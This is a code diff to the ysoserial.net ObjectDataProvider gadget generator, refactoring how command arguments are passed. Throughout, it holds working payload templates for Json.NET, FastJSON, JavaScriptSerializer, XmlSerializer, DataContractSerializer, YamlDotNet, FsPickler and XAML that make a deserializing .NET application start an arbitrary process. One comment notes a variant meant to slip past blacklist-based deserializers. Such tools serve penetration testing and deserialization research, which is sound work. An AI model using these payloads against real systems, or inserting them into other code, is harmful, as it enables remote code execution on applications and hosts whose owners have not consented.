@@ -45,29 +45,29 @@ namespace ysoserial.Generators
             return "ObjectDataProvider";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
             return "Oleksandr Mirosh and Alvaro Munoz";
         }
 
-        public override bool isDerived()
+        public override List<string> Labels()
         {
-            return false;
+            return new List<string> { GadgetTypes.NotBridgeNotDerived };
         }
-
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
+        
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
             // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
             if (formatter.ToLower().Equals("xaml") || formatter.ToLower().Equals("xaml2"))
             {
                 ProcessStartInfo psi = new ProcessStartInfo();
-                Boolean hasArgs;
-                string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, out hasArgs);
-                psi.FileName = splittedCMD[0];
-                if (hasArgs)
+                
+                psi.FileName = inputArgs.CmdFileName;
+                if (inputArgs.HasArguments)
                 {
-                    psi.Arguments = splittedCMD[1];
+                    psi.Arguments = inputArgs.CmdArguments;
                 }
+
                 StringDictionary dict = new StringDictionary();
                 psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                 Process p = new Process();
@@ -90,15 +90,13 @@ namespace ysoserial.Generators
                     payload = XamlWriter.Save(odp);
                 }
                 
-                
-
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     // using discardable regex array to make it shorter!
                     payload = XMLMinifier.Minify(payload, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -112,16 +110,17 @@ namespace ysoserial.Generators
             }
             if (formatter.ToLower().Equals("json.net"))
             {
-                Boolean hasArgs;
-                string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.JSON, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
 
-                if (hasArgs)
+                string cmdPart = "";
+
+                if (inputArgs.HasArguments)
                 {
-                    cmd = "'" + splittedCMD[0] + "', '" + splittedCMD[1] + "'";
+                    cmdPart = "'" + inputArgs.CmdFileName + "', '" + inputArgs.CmdArguments + "'";
                 }
                 else
                 {
-                    cmd = "'" + splittedCMD[0] + "'";
+                    cmdPart = "'" + inputArgs.CmdFileName + "'";
                 }
 
                 String payload = @"{
@@ -129,13 +128,13 @@ namespace ysoserial.Generators
     'MethodName':'Start',
     'MethodParameters':{
         '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
-        '$values':[" + cmd + @"]
+        '$values':[" + cmdPart + @"]
     },
     'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
 }";
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    if (useSimpleType)
+                    if (inputArgs.UseSimpleType)
                     {
                         payload = JSONMinifier.Minify(payload, new String[] { "PresentationFramework", "mscorlib", "System" }, null);
                     }
@@ -145,7 +144,7 @@ namespace ysoserial.Generators
                     }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -159,18 +158,17 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("fastjson"))
             {
-                Boolean hasArgs;
-                string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.JSON, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
 
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = @"""FileName"":""" + splittedCMD[0] + @""",""Arguments"":""" + splittedCMD[1] + @"""";
+                    cmdPart = @"""FileName"":""" + inputArgs.CmdFileName + @""",""Arguments"":""" + inputArgs.CmdArguments + @"""";
                 }
                 else
                 {
-                    cmdPart = @"""FileName"":""" + splittedCMD[0] + @"""";
+                    cmdPart = @"""FileName"":""" + inputArgs.CmdFileName + @"""";
                 }
 
                 String payload = @"{
@@ -190,12 +188,12 @@ namespace ysoserial.Generators
     ""MethodName"":""Start""
 }";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = JSONMinifier.Minify(payload, null, null);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -210,18 +208,17 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("javascriptserializer"))
             {
-                Boolean hasArgs;
-                string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.JSON, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
 
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = "'FileName':'" + splittedCMD[0] + "', 'Arguments':'" + splittedCMD[1] + "'";
+                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "', 'Arguments':'" + inputArgs.CmdArguments + "'";
                 }
                 else
                 {
-                    cmdPart = "'FileName':'" + splittedCMD[0] + "'";
+                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "'";
                 }
 
                 String payload = @"{
@@ -236,12 +233,12 @@ namespace ysoserial.Generators
     }
 }";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = JSONMinifier.Minify(payload, null, null);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -255,19 +252,17 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("xmlserializer"))
             {
-
-                Boolean hasArgs;
-                string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.XML, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
 
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                 }
                 else
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String>";
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                 }
 
                 String payload = $@"<?xml version=""1.0""?>
@@ -287,13 +282,13 @@ namespace ysoserial.Generators
 </root>
 ";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = XMLMinifier.Minify(payload, null, null, FormatterType.XMLSerializer, true);
                 }
 
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -309,18 +304,17 @@ namespace ysoserial.Generators
             {
                 // This by mixing what we had already in xmlserializer and datacontractserializer
                 // this can be useful to bypass deserializers that are based on a blacklist
-                Boolean hasArgs;
-                string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.XML, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
 
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                 }
                 else
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String>";
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                 }
 
                 String payload = $@"<?xml version=""1.0""?>
@@ -341,12 +335,12 @@ namespace ysoserial.Generators
     </ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW>
 </root>
 ";
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -360,20 +354,18 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("datacontractserializer"))
             {
-
-                Boolean hasArgs;
-                string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.XML, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
 
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = $@"<b:anyType i:type=""c:string"">" + splittedCMD[0] + @"</b:anyType>
-          <b:anyType i:type=""c:string"">" + splittedCMD[1] + "</b:anyType>";
+                    cmdPart = $@"<b:anyType i:type=""c:string"">" + inputArgs.CmdFileName + @"</b:anyType>
+          <b:anyType i:type=""c:string"">" + inputArgs.CmdArguments + "</b:anyType>";
                 }
                 else
                 {
-                    cmdPart = $@"<anyType i:type=""c:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">" + splittedCMD[0] + @"</anyType>";
+                    cmdPart = $@"<anyType i:type=""c:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">" + inputArgs.CmdFileName + @"</anyType>";
                 }
 
                 String payload = $@"<?xml version=""1.0""?>
@@ -396,12 +388,12 @@ namespace ysoserial.Generators
     </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
 </root>
 ";
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -415,20 +407,18 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("yamldotnet"))
             {
-
-                Boolean hasArgs;
-                string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.YamlDotNet, out hasArgs);
-
+                inputArgs.CmdType = CommandArgSplitter.CommandType.YamlDotNet;
+                
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = $@"FileName: " + splittedCMD[0] + @",
-					Arguments: " + splittedCMD[1];
+                    cmdPart = $@"FileName: " + inputArgs.CmdFileName + @",
+					Arguments: " + inputArgs.CmdArguments;
                 }
                 else
                 {
-                    cmdPart = $@"FileName: " + splittedCMD[0];
+                    cmdPart = $@"FileName: " + inputArgs.CmdFileName;
                 }
 
                 String payload = @"
@@ -444,12 +434,12 @@ namespace ysoserial.Generators
         }
 }";
                 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = YamlDocumentMinifier.Minify(payload);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -463,18 +453,19 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("fspickler"))
             {
-                Boolean hasArgs;
-                string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.XML, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
+                //Boolean hasArgs;
+                //string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.XML, out hasArgs);
 
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                 }
                 else
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String>";
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                 }
 
                 String internalPayload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>";
@@ -517,12 +508,12 @@ namespace ysoserial.Generators
     }
   }";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = JSONMinifier.Minify(payload, null, null);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
